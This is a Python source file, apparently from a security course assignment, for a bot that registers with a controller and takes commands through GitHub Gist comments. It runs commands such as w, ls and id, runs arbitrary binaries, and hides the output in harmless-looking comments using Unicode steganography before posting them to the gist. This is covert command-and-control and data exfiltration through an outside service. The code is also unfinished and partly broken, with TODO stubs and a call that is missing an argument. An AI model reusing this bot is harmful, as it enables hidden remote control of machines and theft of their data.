import subprocess

import requests
import time
import pyUnicodeSteganography as usteg

TOKEN = "your-personal-access-token"  # Your GitHub personal access token
API_URL = "https://api.github.com/gists"  # The URL of the GitHub Gist API
HEADERS = {"Authorization": f"Bearer {TOKEN}"}  # Set the authorization header
CONTROLLER_URL = "http://127.0.0.1:5000"
CHECKING_COMMENT_PERIOD_SECONDS = 10


def check_new_comments(gist_id):

    comments = get_gist_comments()
    number_of_comments = 0 # TODO

    while True:
        new_comments = get_gist_comments()
        new_number_of_comments = 0 # TODO

        if new_number_of_comments > number_of_comments:
            # TODO analyze comments
            # TODO if something new then execute command, translate and add to gist comment
            pass
        else:
            time.sleep(CHECKING_COMMENT_PERIOD_SECONDS)


def execute_cmd_w(gist_id):
    message = "Your snippet is very good."
    secret = subprocess.getoutput("w")
    secret = "[RES w] " + secret

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)


def execute_cmd_ls(path, gist_id):
    message = "Comments make the code clearer"
    cmd_req = "ls " + "\"" + path + "\""
    secret = subprocess.getoutput(cmd_req)
    secret = "[RES ls " + path + "] " + secret

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)


def execute_cmd_id(gist_id):
    message = "In line 5 is missing comma."
    secret = subprocess.getoutput("id")
    secret = "[RES id] " + secret

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)


def execute_copy_file(file_name, gist_id) -> bytes:
    file = open(file_name, "r")
    # TODO
    return file.read()


def execute_binary(binary, gist_id):
    message = "BSY is the best course!"
    secret = "[RES binary executed]"
    subprocess.run(binary)

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)


def send_alive_msg(gist_id):
    message = "Im here :)"
    secret = "[RES alive]"

    encoded = usteg.encode(message, secret)
    add_gist_comment(gist_id, encoded)


def get_gist_comments(gist_id):
    url = API_URL + "/" + gist_id + "/comments"
    response = requests.get(url, headers=HEADERS)
    return response.json()


def add_gist_comment(gist_id, message):
    data = {
        "body": message
    }

    url = API_URL + "/" + gist_id + "/comments"
    requests.post(url, json=data, headers=HEADERS)
    return


# At the start he must register to controller. Then controller will create gist and the next communication will be
# via gist.
controller_response = requests.post(CONTROLLER_URL + "/register-bot")
gist = controller_response.json().get("gist_id")

if gist is None:
    print("Gist is empty - ERROR")
else:
    check_new_comments(gist)
